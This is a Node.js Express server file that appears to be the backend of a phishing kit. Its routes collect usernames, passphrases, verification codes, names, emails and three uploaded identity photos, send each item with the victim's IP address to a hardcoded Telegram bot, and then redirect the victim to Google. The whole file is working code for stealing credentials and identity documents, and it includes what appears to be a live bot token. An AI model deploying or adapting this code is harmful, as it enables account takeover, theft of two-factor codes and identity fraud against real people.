const express = require("express");
const bodyParser = require("body-parser");
const multer = require("multer");
const fetch = require("node-fetch");
const path = require("path");
const os = require("os");

const app = express();
const PORT = process.env.PORT || 3000;

// 🔹 Telegram setup
const BOT_TOKEN = "8402298293:AAEo_rNw4cRUMo8b9_s4R3cnMJW1QyBpelk";   // <<-- EDIT THIS
const CHAT_ID = "5692748706";       // <<-- EDIT THIS

// Middlewares
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

// Multer for uploads
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, "uploads/");
  },
  filename: function (req, file, cb) {
    cb(null, Date.now() + "-" + file.originalname);
  }
});
const upload = multer({ storage });

// Helper: send to Telegram
async function sendToTelegram(message) {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: message })
    });
  } catch (err) {
    console.error("Telegram error:", err);
  }
}

// Helper: get IP
function getClientIp(req) {
  return (
    req.headers["x-forwarded-for"] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    (req.connection.socket ? req.connection.socket.remoteAddress : null)
  );
}

// 🔹 Routes

// Sign In
app.post("/signin", (req, res) => {
  const { username, passphrase } = req.body;
  const ip = getClientIp(req);
  const time = new Date().toLocaleString();

  const msg = `🔐 New Sign In\n\n👤 Username: ${username}\n🔑 Passphrase: ${passphrase}\n🌍 IP: ${ip}\n🕒 Time: ${time}`;
  sendToTelegram(msg);

  res.json({ ok: true, next: "code.html" });
});

// Code
app.post("/code", (req, res) => {
  const { code } = req.body;
  const ip = getClientIp(req);
  const time = new Date().toLocaleString();

  const msg = `📲 Verification Code\n\n💬 Code: ${code}\n🌍 IP: ${ip}\n🕒 Time: ${time}`;
  sendToTelegram(msg);

  res.json({ ok: true, next: "kyc.html" });
});

// KYC Upload
app.post("/kyc", upload.fields([
  { name: "photo1" },
  { name: "photo2" },
  { name: "photo3" }
]), (req, res) => {
  const { fullname, email } = req.body;
  const files = req.files;
  const ip = getClientIp(req);
  const time = new Date().toLocaleString();

  let msg = `📝 KYC Submission\n\n👤 Full Name: ${fullname}\n📧 Email: ${email}\n🌍 IP: ${ip}\n🕒 Time: ${time}`;
  sendToTelegram(msg);

  // send files to Telegram
  Object.values(files || {}).forEach(fileArr => {
    fileArr.forEach(async (file) => {
      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("document", require("fs").createReadStream(file.path));

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
        method: "POST",
        body: formData
      });
    });
  });

  res.json({ ok: true, redirect: "https://www.google.com" }); // change redirect URL if needed
});

// Start server
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));